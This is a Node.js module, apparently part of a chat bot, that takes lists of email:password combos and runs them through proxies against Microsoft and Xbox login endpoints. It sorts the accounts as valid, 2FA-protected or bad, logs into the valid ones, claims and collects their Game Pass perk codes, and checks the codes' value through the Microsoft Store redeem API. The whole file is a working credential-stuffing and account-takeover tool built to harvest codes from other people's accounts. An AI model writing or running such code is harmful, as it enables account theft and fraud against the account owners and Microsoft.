// ============================================================
//  Xbox Code Fetcher + Validator (PrepareRedeem)
//  100% exact same logic as the Python script, ported to Node.js
//  Now also runs PRS (Rewards Scraper) in parallel per account
// ============================================================

const crypto = require("crypto");
const { checkCodes } = require("./microsoft-checker");
const { getWlids } = require("./wlid-store");
const { proxiedFetch } = require("./proxy-manager");
const { runQueue } = require("./account-queue");

// ── Code Format Validation (exact match to Python) ───────────

const INVALID_CHARS = new Set(["A", "E", "I", "O", "U", "L", "S", "0", "1", "5"]);

function isInvalidCodeFormat(code) {
  if (!code || code.length < 5 || code.includes(" ")) return true;
  for (const char of code) {
    if (INVALID_CHARS.has(char)) return true;
  }
  return false;
}

// ── AIO-style CookieJar (exact from meowmal-aio.js) ──────────

class CookieJar {
  constructor() {
    this.cookies = {};
  }
  ingest(setCookieHeaders) {
    if (!setCookieHeaders) return;
    const headers = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
    for (const h of headers) {
      const parts = h.split(";")[0].split("=");
      if (parts.length >= 2) {
        const name = parts[0].trim();
        const value = parts.slice(1).join("=").trim();
        this.cookies[name] = value;
      }
    }
  }
  get(name) {
    return this.cookies[name] || null;
  }
  header() {
    return Object.entries(this.cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join("; ");
  }
}

// ── AIO-style sessionFetch (manual redirects, cookie tracking) ──

async function sessionFetch(url, options, jar, timeoutMs = 15000) {
  let currentUrl = url;
  let redirectCount = 0;
  const MAX_REDIRECTS = 15;
  let lastText = "";
  let lastStatus = 0;

  while (redirectCount < MAX_REDIRECTS) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeoutMs);

    try {
      const fetchOpts = {
        ...options,
        signal: ctrl.signal,
        redirect: "manual",
        headers: {
          ...(options.headers || {}),
          Cookie: jar.header(),
        },
      };

      const res = await proxiedFetch(currentUrl, fetchOpts);
      lastStatus = res.status;

      // Ingest cookies
      const setCookie = res.headers.raw ? res.headers.raw()["set-cookie"] : res.headers.getSetCookie?.();
      if (setCookie) jar.ingest(setCookie);

      if ([301, 302, 303, 307, 308].includes(res.status)) {
        const loc = res.headers.get("location");
        if (!loc) break;
        currentUrl = loc.startsWith("http") ? loc : new URL(loc, currentUrl).href;
        try { await res.text(); } catch {}
        redirectCount++;
        if ([301, 302, 303].includes(res.status)) {
          options = { ...options, method: "GET", body: undefined };
          if (options.headers) delete options.headers["Content-Type"];
        }
        continue;
      }

      lastText = await res.text();
      break;
    } catch (err) {
      if (err.name === "AbortError") break;
      throw err;
    } finally {
      clearTimeout(t);
    }
  }

  return { text: lastText, finalUrl: currentUrl, status: lastStatus, jar };
}

// ── Regex patterns (exact from meowmal-aio.js) ──────────────

const RE_SFTTAG_VALUE = /value=\\"(.+?)\\"|value="(.+?)"|sFTTag:'(.+?)'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"/s;
const RE_URLPOST_VALUE = /"urlPost":"(.+?)"|urlPost:'(.+?)'|urlPost:"(.+?)"|<form.*?action=\\"(.+?)\\"/s;
const RE_IPT = /(?<="ipt" value=").+?(?=">)/;
const RE_PPRID = /(?<="pprid" value=").+?(?=">)/;
const RE_UAID = /(?<="uaid" value=").+?(?=">)/;
const RE_ACTION_FMHF = /(?<=id="fmHF" action=").+?(?=" )/;
const RE_RETURN_URL = /(?<="recoveryCancel":\{"returnUrl":").+?(?=",)/;

const sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en";

const MAX_RETRIES = 3;

// ── preCheckCombo (exact from meowmal-aio.js) ────────────────

async function preCheckCombo(email, password) {
  const url = "https://login.live.com/ppsecure/post.srf";
  const params = new URLSearchParams({
    nopa: "2",
    client_id: "7d5c843b-fe26-45f7-9073-b683b2ac7ec3",
    cobrandid: "8058f65d-ce06-4c30-9559-473c9275a65d",
    contextid: "F3FB0F6AB3D6991E",
    opid: "5F188DEDF4A1266A",
    bk: "1768757278",
    uaid: "b1d1e6fbf8b24f9b8a73b347b178d580",
    pid: "15216",
  });

  const payload = new URLSearchParams({
    ps: "2", psRNGCDefaultType: "", psRNGCEntropy: "", psRNGCSLK: "",
    canary: "", ctx: "", hpgrequestid: "",
    PPFT: "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$",
    PPSX: "P", NewUser: "1", FoundMSAs: "", fspost: "0", i21: "0",
    CookieDisclosure: "0", IsFidoSupported: "1", isSignupPost: "0",
    isRecoveryAttemptPost: "0", i13: "0", login: email, loginfmt: email,
    type: "11", LoginOptions: "3", lrt: "", lrtPartition: "",
    hisRegion: "", hisScaleUnit: "", cpr: "0", passwd: password,
  });

  const headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Cache-Control": "max-age=0",
    "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "sec-ch-ua-platform-version": '"12.0.0"',
    Origin: "https://login.live.com",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    Referer: "https://login.live.com/oauth20_authorize.srf?nopa=2&client_id=7d5c843b-fe26-45f7-9073-b683b2ac7ec3&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&contextid=F3FB0F6AB3D6991E&ru=https%3A%2F%2Fuser.auth.xboxlive.com%2Fdefault.aspx",
    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8,ku;q=0.7,ro;q=0.6",
  };

  let currentTry = 0;
  while (currentTry <= Math.min(2, MAX_RETRIES)) {
    try {
      const res = await proxiedFetch(`${url}?${params}`, {
        method: "POST",
        headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" },
        body: payload.toString(),
        redirect: "follow",
      });

      const statusCode = res.status;
      const responseText = (await res.text()).toLowerCase();

      if (statusCode >= 500 || statusCode === 429) {
        currentTry++;
        await new Promise(r => setTimeout(r, 1500));
        continue;
      }

      const twoFaIndicators = [
        "suggestedaction", "sign in to continue", "enter code", "two-step",
        "two. step", "two factor", "2fa", "second verification", "verification code",
        "authenticator", "texted you", "sent a code", "enter the code",
        "additional security", "extra security",
      ];
      if (twoFaIndicators.some((ind) => responseText.includes(ind))) return "2FA";

      const successIndicators = [
        "to do that, sign in", "welcome", "redirecting", "location.href",
        "home.live.com", "account.microsoft.com", "myaccount.microsoft.com",
        "profile.microsoft.com", "https://account.live.com/", "microsoft account home",
        "signed in successfully", "you're signed in",
      ];
      if (successIndicators.some((ind) => responseText.includes(ind))) return "HIT";

      const failureIndicators = [
        "invalid username or password", "that microsoft account doesn't exist",
        "incorrect password", "your account or password is incorrect",
        "sorry, that password isn't right", "entered is incorrect",
        "account doesn't exist", "no account found", "wrong password",
        "incorrect credentials", "login failed", "sign in unsuccessful",
        "we couldn't find an account", "please check your credentials",
        "sign-in was blocked", "account is locked", "suspended",
        "temporarily locked", "security challenge", "unusual activity",
        "verify your identity", "account review", "safety concerns",
      ];
      if (failureIndicators.some((ind) => responseText.includes(ind))) return "BAD";

      return "UNKNOWN";
    } catch {
      currentTry++;
      await new Promise(r => setTimeout(r, 1500));
    }
  }
  return "ERROR";
}

// ── getUrlPostSFTTag (exact from meowmal-aio.js) ────────────

async function getUrlPostSFTTag(jar) {
  let attempts = 0;
  while (attempts < MAX_RETRIES) {
    try {
      const headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
      };

      const { text } = await sessionFetch(sFTTag_url, { method: "GET", headers }, jar, 15000);

      const match = RE_SFTTAG_VALUE.exec(text);
      if (match) {
        const sFTTag = match[1] || match[2] || match[3] || match[4] || match[5];
        if (sFTTag) {
          const matchUrl = RE_URLPOST_VALUE.exec(text);
          if (matchUrl) {
            let urlPost = matchUrl[1] || matchUrl[2] || matchUrl[3] || matchUrl[4];
            if (urlPost) {
              urlPost = urlPost.replace(/&amp;/g, "&");
              return { urlPost, sFTTag };
            }
          }
        }
      }
    } catch {}

    attempts++;
    await new Promise(r => setTimeout(r, 100));
  }
  return { urlPost: null, sFTTag: null };
}

// ── getXboxRps (exact from meowmal-aio.js) ───────────────────

async function getXboxRps(jar, email, password, urlPost, sFTTag) {
  let tries = 0;
  while (tries < MAX_RETRIES) {
    try {
      const data = new URLSearchParams({
        login: email, loginfmt: email, passwd: password, PPFT: sFTTag,
      });
      const headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        Connection: "close",
      };

      const { text: responseText, finalUrl } = await sessionFetch(urlPost, {
        method: "POST",
        headers,
        body: data.toString(),
      }, jar, 15000);

      if (finalUrl.includes("#") && finalUrl !== sFTTag_url) {
        const parsed = new URL(finalUrl);
        const fragment = parsed.hash.slice(1);
        const params = new URLSearchParams(fragment);
        const token = params.get("access_token");
        if (token && token !== "None") return token;
      }

      if (responseText.includes("cancel?mkt=")) {
        try {
          const iptMatch = RE_IPT.exec(responseText);
          const ppridMatch = RE_PPRID.exec(responseText);
          const uaidMatch = RE_UAID.exec(responseText);
          const actionMatch = RE_ACTION_FMHF.exec(responseText);

          if (iptMatch && ppridMatch && uaidMatch && actionMatch) {
            const formData = new URLSearchParams({
              ipt: iptMatch[0], pprid: ppridMatch[0], uaid: uaidMatch[0],
            });
            const { text: retText } = await sessionFetch(actionMatch[0], {
              method: "POST",
              headers: { "Content-Type": "application/x-www-form-urlencoded" },
              body: formData.toString(),
            }, jar, 15000);

            const returnUrlMatch = RE_RETURN_URL.exec(retText);
            if (returnUrlMatch) {
              const { finalUrl: finUrl } = await sessionFetch(returnUrlMatch[0], { method: "GET" }, jar, 15000);
              const parsed2 = new URL(finUrl);
              const fragment2 = parsed2.hash.slice(1);
              const params2 = new URLSearchParams(fragment2);
              const token2 = params2.get("access_token");
              if (token2 && token2 !== "None") return token2;
            }
          }
        } catch {}
      }

      if (["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="].some((v) => responseText.includes(v))) {
        return "2FA";
      }

      const badIndicators = ["password is incorrect", "account doesn't exist", "that microsoft account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password", "help us protect your account"];
      if (badIndicators.some((v) => responseText.toLowerCase().includes(v))) {
        return "None";
      }

      tries++;
      await new Promise(r => setTimeout(r, 100));
    } catch {
      tries++;
      await new Promise(r => setTimeout(r, 100));
    }
  }
  return "None";
}

async function getXboxTokens(rpsToken) {
  try {
    const userRes = await proxiedFetch(
      "https://user.auth.xboxlive.com/user/authenticate",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          RelyingParty: "http://auth.xboxlive.com",
          TokenType: "JWT",
          Properties: {
            AuthMethod: "RPS",
            SiteName: "user.auth.xboxlive.com",
            RpsTicket: rpsToken,
          },
        }),
      }
    );
    if (userRes.status !== 200) return { uhs: null, xstsToken: null };
    const userData = await userRes.json();
    const userToken = userData.Token;

    const xstsRes = await proxiedFetch(
      "https://xsts.auth.xboxlive.com/xsts/authorize",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          RelyingParty: "http://xboxlive.com",
          TokenType: "JWT",
          Properties: {
            UserTokens: [userToken],
            SandboxId: "RETAIL",
          },
        }),
      }
    );
    if (xstsRes.status !== 200) return { uhs: null, xstsToken: null };
    const xstsData = await xstsRes.json();
    const uhs = xstsData.DisplayClaims?.xui?.[0]?.uhs || null;
    return { uhs, xstsToken: xstsData.Token };
  } catch {
    return { uhs: null, xstsToken: null };
  }
}

function isLink(resource) {
  return resource && (resource.startsWith("http://") || resource.startsWith("https://"));
}

async function fetchCodesFromXbox(uhs, xstsToken) {
  try {
    const auth = `XBL3.0 x=${uhs};${xstsToken}`;
    const baseHeaders = {
      Authorization: auth,
      "Content-Type": "application/json",
      "User-Agent": "okhttp/4.12.0",
    };

    // Try v3 first (new endpoint), fall back to v2
    let data = null;
    for (const ver of ["v3", "v2"]) {
      try {
        const res = await proxiedFetch(`https://profile.gamepass.com/${ver}/offers`, {
          headers: baseHeaders,
        });
        if (res.status === 200) {
          data = await res.json();
          if (data && (data.offers?.length > 0 || data.perks?.length > 0)) break;
        }
      } catch {}
    }
    if (!data) return { codes: [], links: [] };

    const codes = [];
    const links = [];

    // Handle both response formats: data.offers (v2) and data.perks (possible v3)
    const offerList = data.offers || data.perks || [];
    for (const offer of offerList) {
      // Extract resource from various possible fields
      const resource = offer.resource || offer.code || offer.redemptionUrl || offer.url || null;
      if (resource) {
        if (isLink(resource)) {
          links.push(resource);
        } else {
          codes.push(resource);
        }
        continue;
      }

      // If offer is claimable, try claiming via v2 POST (v3 is GET-only)
      if (offer.offerStatus === "available" || offer.status === "available" || offer.claimable) {
        const offerId = offer.offerId || offer.id;
        if (!offerId) continue;
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let cv = "";
        for (let i = 0; i < 22; i++) cv += chars[Math.floor(Math.random() * chars.length)];
        cv += ".0";

        try {
          const claimRes = await proxiedFetch(
            `https://profile.gamepass.com/v2/offers/${offerId}`,
            {
              method: "POST",
              headers: {
                ...baseHeaders,
                "ms-cv": cv,
                "Content-Length": "0",
              },
              body: "",
            }
          );
          if (claimRes.status === 200) {
            const claimData = await claimRes.json();
            const claimedResource = claimData.resource || claimData.code || claimData.redemptionUrl || null;
            if (claimedResource) {
              if (isLink(claimedResource)) {
                links.push(claimedResource);
              } else {
                codes.push(claimedResource);
              }
            }
          }
        } catch {}
      }
    }
    return { codes, links };
  } catch {
    return { codes: [], links: [] };
  }
}

// ── Store Login + PrepareRedeem Validation ────────────────────
// Exact same flow as Python: login.live.com/ppsecure → redirect → form submit → session

async function loginMicrosoftStore(email, password) {
  const headers = {
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
    Accept:
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9",
    Referer: "https://account.microsoft.com/",
    Origin: "https://account.microsoft.com",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
  };

  let cookieJar = "";

  function extractCookies(res) {
    const sc = res.headers.getSetCookie?.() || [];
    for (const c of sc) {
      const parts = c.split(";")[0].trim();
      if (parts.includes("=")) cookieJar += "; " + parts;
    }
  }

  async function storeGet(url) {
    const res = await proxiedFetch(url, {
      headers: { ...headers, Cookie: cookieJar },
      redirect: "follow",
    });
    extractCookies(res);
    return { res, text: await res.text() };
  }

  async function storePost(url, body, extraHeaders = {}) {
    const res = await proxiedFetch(url, {
      method: "POST",
      headers: { ...headers, Cookie: cookieJar, ...extraHeaders },
      body,
      redirect: "follow",
    });
    extractCookies(res);
    return { res, text: await res.text() };
  }

  try {
    // Login via ppsecure — exact same as Python
    const bk = Math.floor(Date.now() / 1000);
    const loginUrl = `https://login.live.com/ppsecure/post.srf?username=${encodeURIComponent(email)}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=${bk}&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none`;

    const { text: loginText } = await storePost(
      loginUrl,
      new URLSearchParams({
        login: email,
        loginfmt: email,
        passwd: password,
        PPFT: "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$",
      }).toString(),
      { "Content-Type": "application/x-www-form-urlencoded" }
    );

    const cleaned = loginText.replace(/\\/g, "");
    const reurlMatch = cleaned.match(/replace\("([^"]+)"/);
    if (!reurlMatch) return null;

    const { text: reresp } = await storeGet(reurlMatch[1]);

    const actionMatch = reresp.match(/<form.*?action="(.*?)".*?>/);
    if (!actionMatch) return null;

    const inputMatches = [...reresp.matchAll(/<input.*?name="(.*?)".*?value="(.*?)".*?>/g)];
    const formData = new URLSearchParams();
    for (const m of inputMatches) formData.append(m[1], m[2]);

    await storePost(actionMatch[1], formData.toString(), {
      "Content-Type": "application/x-www-form-urlencoded",
    });

    return { cookieJar, headers };
  } catch {
    return null;
  }
}

// Exact same reference ID generation as Python
function generateReferenceId() {
  const timestampVal = Math.floor(Date.now() / 30000);
  const n = timestampVal.toString(16).toUpperCase().padStart(8, "0");
  const o = (crypto.randomUUID().replace(/-/g, "") + crypto.randomUUID().replace(/-/g, "")).toUpperCase();
  const result = [];
  for (let e = 0; e < 64; e++) {
    if (e % 8 === 1) {
      result.push(n[Math.floor((e - 1) / 8)] || "0");
    } else {
      result.push(o[e] || "0");
    }
  }
  return result.join("");
}

async function getStoreAuthToken(cookieJar, headers) {
  try {
    // Touch buynow endpoint first — exact same as Python
    await proxiedFetch("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", {
      headers: { ...headers, Cookie: cookieJar },
    }).catch(() => {});

    const tokenRes = await proxiedFetch(
      "https://account.microsoft.com/auth/acquire-onbehalf-of-token?scopes=MSComServiceMBISSL",
      {
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          "X-Requested-With": "XMLHttpRequest",
          "Cache-Control": "no-cache",
          Pragma: "no-cache",
          Referer: "https://account.microsoft.com/billing/redeem",
          "User-Agent": headers["User-Agent"],
          Cookie: cookieJar,
        },
      }
    );
    if (tokenRes.status !== 200) return null;
    const data = await tokenRes.json();
    if (!data || !data[0]?.token) return null;
    return data[0].token;
  } catch {
    return null;
  }
}

// Exact same store cart state extraction as Python
async function getStoreCartState(token, cookieJar, headers) {
  try {
    const msCv = "xddT7qMNbECeJpTq.6.2";
    const payload = new URLSearchParams({
      data: '{"usePurchaseSdk":true}',
      market: "US",
      cV: msCv,
      locale: "en-GB",
      msaTicket: token,
      pageFormat: "full",
      urlRef: "https://account.microsoft.com/billing/redeem",
      isRedeem: "true",
      clientType: "AccountMicrosoftCom",
      layout: "Inline",
      cssOverride: "AMC",
      scenario: "redeem",
      timeToInvokeIframe: "4977",
      sdkVersion: "VERSION_PLACEHOLDER",
    });

    const res = await proxiedFetch(
      `https://www.microsoft.com/store/purchase/buynowui/redeemnow?ms-cv=${msCv}&market=US&locale=en-GB&clientName=AccountMicrosoftCom`,
      {
        method: "POST",
        headers: {
          ...headers,
          Cookie: cookieJar,
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: payload.toString(),
      }
    );

    const text = await res.text();
    const match = text.match(/window\.__STORE_CART_STATE__=({.*?});/s);
    if (!match) return null;

    const storeState = JSON.parse(match[1]);
    return {
      ms_cv: storeState.appContext?.cv || "",
      correlation_id: storeState.appContext?.correlationId || "",
      tracking_id: storeState.appContext?.trackingId || "",
      vector_id: storeState.appContext?.muid || "",
      muid: storeState.appContext?.alternativeMuid || "",
    };
  } catch {
    return null;
  }
}

// Exact same PrepareRedeem validation as Python — with all headers matched
async function validateCodePrepareRedeem(code, token, storeState, cookieJar, userAgent) {
  // Exact same format validation as Python
  if (isInvalidCodeFormat(code)) {
    return { code, status: "INVALID", message: `${code} | INVALID` };
  }

  // Exact same headers as Python script
  const hdrs = {
    host: "buynow.production.store-web.dynamics.com",
    connection: "keep-alive",
    "x-ms-tracking-id": storeState.tracking_id,
    "sec-ch-ua-platform": '"Windows"',
    authorization: `WLID1.0=t=${token}`,
    "x-ms-client-type": "AccountMicrosoftCom",
    "x-ms-market": "US",
    "sec-ch-ua": '"Chromium";v="142", "Microsoft Edge";v="142", "Not_A Brand";v="99"',
    "ms-cv": storeState.ms_cv,
    "sec-ch-ua-mobile": "?0",
    "x-ms-reference-id": generateReferenceId(),
    "x-ms-vector-id": storeState.vector_id,
    "user-agent": userAgent,
    "x-ms-correlation-id": storeState.correlation_id,
    "content-type": "application/json",
    "x-authorization-muid": storeState.muid,
    accept: "*/*",
    Cookie: cookieJar,
  };

  try {
    const res = await proxiedFetch(
      "https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken",
      { method: "POST", headers: hdrs, body: JSON.stringify({}) }
    );

    if (res.status === 429) return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };
    if (res.status !== 200) return { code, status: "ERROR", message: `${code} | HTTP ${res.status}` };

    const data = await res.json();

    // Balance code — exact same as Python
    if (data.tokenType === "CSV") {
      return { code, status: "BALANCE_CODE", message: `${code} | ${data.value} ${data.currency}` };
    }

    // Rate limit checks — exact same as Python
    if (data.errorCode === "TooManyRequests") return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };
    if (data.error?.code === "TooManyRequests") return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };

    // Cart events — exact same reason mapping as Python
    if (data.events?.cart?.[0]) {
      const cart = data.events.cart[0];
      if (cart.type === "error") {
        if (String(cart.code).includes("TooManyRequests") || String(cart).includes("TooManyRequests"))
          return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };

        const reason = cart.data?.reason;
        if (reason) {
          if (reason.includes("TooManyRequests") || reason.includes("RateLimit"))
            return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };
          if (reason === "RedeemTokenAlreadyRedeemed")
            return { code, status: "REDEEMED", message: `${code} | REDEEMED` };
          if (["RedeemTokenExpired", "LegacyTokenAuthenticationNotProvided", "RedeemTokenNoMatchingOrEligibleProductsFound"].includes(reason))
            return { code, status: "EXPIRED", message: `${code} | EXPIRED` };
          if (reason === "RedeemTokenStateDeactivated")
            return { code, status: "DEACTIVATED", message: `${code} | DEACTIVATED` };
          if (reason === "RedeemTokenGeoFencingError")
            return { code, status: "REGION_LOCKED", message: `${code} | REGION_LOCKED` };
          if (["RedeemTokenNotFound", "InvalidProductKey", "RedeemTokenStateUnknown"].includes(reason))
            return { code, status: "INVALID", message: `${code} | INVALID` };
          return { code, status: "INVALID", message: `${code} | INVALID` };
        }
      }
    }

    // Valid product — exact same logic as Python
    if (data.products?.length > 0) {
      const productInfo = data.productInfos?.[0] || {};
      const productId = productInfo.productId;
      for (const product of data.products) {
        if (product.id === productId) {
          const title = product.sku?.title || product.title || "Unknown Title";
          const isPIRequired = productInfo.isPIRequired || false;
          const status = isPIRequired ? "VALID_REQUIRES_CARD" : "VALID";
          return { code, status, title, message: `${code} | ${title}` };
        }
      }
    }

    return { code, status: "UNKNOWN", message: `${code} | UNKNOWN` };
  } catch (err) {
    return { code, status: "ERROR", message: `${code} | ${err.message}` };
  }
}

// ── Main Pull Pipeline ───────────────────────────────────────

async function fetchFromAccount(email, password) {
  try {
    // ── Phase 0: Pre-check (exact AIO logic) ──
    const bypass = await preCheckCombo(email, password);
    if (bypass === "BAD") return { email, codes: [], links: [], error: "Invalid credentials" };
    if (bypass === "2FA") return { email, codes: [], links: [], error: "2FA" };
    if (bypass === "ERROR") return { email, codes: [], links: [], error: "Pre-check failed" };

    // ── Phase 1: Dynamic PPFT login (exact AIO logic) ──
    const jar = new CookieJar();

    const { urlPost, sFTTag } = await getUrlPostSFTTag(jar);
    if (!urlPost || !sFTTag) return { email, codes: [], links: [], error: "OAuth failed" };

    const rps = await getXboxRps(jar, email, password, urlPost, sFTTag);
    if (rps === "2FA") return { email, codes: [], links: [], error: "2FA" };
    if (rps === "None" || !rps) return { email, codes: [], links: [], error: "Login failed" };

    // ── Phase 2: Xbox tokens (same as before) ──
    const { uhs, xstsToken } = await getXboxTokens(rps);
    if (!uhs) return { email, codes: [], links: [], error: "Xbox tokens failed" };

    const { codes, links } = await fetchCodesFromXbox(uhs, xstsToken);
    return { email, codes, links };
  } catch (err) {
    return { email, codes: [], links: [], error: err.message };
  }
}

async function validateCodesWithStore(email, password, codes, onProgress) {
  const storeSession = await loginMicrosoftStore(email, password);
  if (!storeSession) return codes.map((c) => ({ code: c, status: "ERROR", message: `${c} | Store login failed` }));

  const token = await getStoreAuthToken(storeSession.cookieJar, storeSession.headers);
  if (!token) return codes.map((c) => ({ code: c, status: "ERROR", message: `${c} | Token failed` }));

  const storeState = await getStoreCartState(token, storeSession.cookieJar, storeSession.headers);
  if (!storeState) return codes.map((c) => ({ code: c, status: "ERROR", message: `${c} | Store state failed` }));

  const results = [];
  for (let i = 0; i < codes.length; i++) {
    const result = await validateCodePrepareRedeem(
      codes[i], token, storeState, storeSession.cookieJar, storeSession.headers["User-Agent"]
    );
    results.push(result);
    if (onProgress) onProgress(i + 1, codes.length);

    // If rate limited, stop validating with this account — same as Python
    if (result.status === "RATE_LIMITED") {
      for (let j = i + 1; j < codes.length; j++) {
        results.push({ code: codes[j], status: "SKIPPED", message: `${codes[j]} | Skipped (rate limited)` });
      }
      break;
    }
  }
  return results;
}

/**
 * Full pull pipeline (controlled concurrency, no skipped hits):
 *   Phase 1 — Fetch codes from Game Pass perks with 3 workers + retry queue
 *   Phase 2 — Validate all codes using WLID checker
 *
 * Phase 2 (PRS recheck) was REMOVED to prevent skips and save time.
 * Each fetched code carries a `sourceEmail` so DMs can show origin.
 */
async function pullCodes(accounts, onProgress, signal) {
  const parsed = accounts.map((a) => {
    const i = a.indexOf(":");
    return i === -1 ? { email: a, password: "" } : { email: a.substring(0, i), password: a.substring(i + 1) };
  });

  const fetchResults = [];
  const allCodes = []; // [{ code, sourceEmail }]

  await runQueue({
    items: parsed,
    concurrency: 30,
    maxRetries: 2,
    signal,
    runner: async ({ email, password }, attempt) => {
      const result = await fetchFromAccount(email, password);
      // Retry on transient login/oauth/xbox failures (max 2 retries via queue)
      const transient =
        result.error === "OAuth failed" ||
        result.error === "Xbox tokens failed";
      if (transient && attempt < 2) return { retry: true };

      const codes = result.codes || [];
      const links = result.links || [];
      fetchResults.push({ email: result.email, codes: [...codes], links, error: result.error });
      for (const c of codes) allCodes.push({ code: c, sourceEmail: result.email });

      if (onProgress) {
        onProgress("fetch", {
          email,
          codes: codes.length,
          error: result.error,
          done: fetchResults.length,
          total: parsed.length,
        });
      }
      return { result: result };
    },
  });

  if (signal && signal.aborted) return { fetchResults, validateResults: [] };
  if (allCodes.length === 0) return { fetchResults, validateResults: [] };

  // ── Phase 2: Validate using WLID checker ──
  const wlids = getWlids();
  if (wlids.length === 0) {
    const validateResults = allCodes.map(({ code, sourceEmail }) => ({
      code,
      sourceEmail,
      status: "error",
      message: `${code} | No WLIDs stored — use .wlidset first`,
    }));
    return { fetchResults, validateResults };
  }

  if (onProgress) onProgress("validate_start", { total: allCodes.length, fetchResults });

  // checkCodes wants raw code strings; we re-attach sourceEmail after.
  const codeIndex = new Map();
  allCodes.forEach((entry, i) => codeIndex.set(entry.code, entry.sourceEmail));

  const validateResults = await checkCodes(wlids, allCodes.map(c => c.code), 10, (done, total, lastResult) => {
    if (onProgress) onProgress("validate", { done, total, status: lastResult?.status });
  }, signal);

  // Attach source email so DMs can show "code | title | from email"
  for (const r of validateResults) {
    r.sourceEmail = codeIndex.get(r.code) || "";
  }

  return { fetchResults, validateResults };
}

module.exports = { pullCodes, fetchFromAccount, validateCodesWithStore };
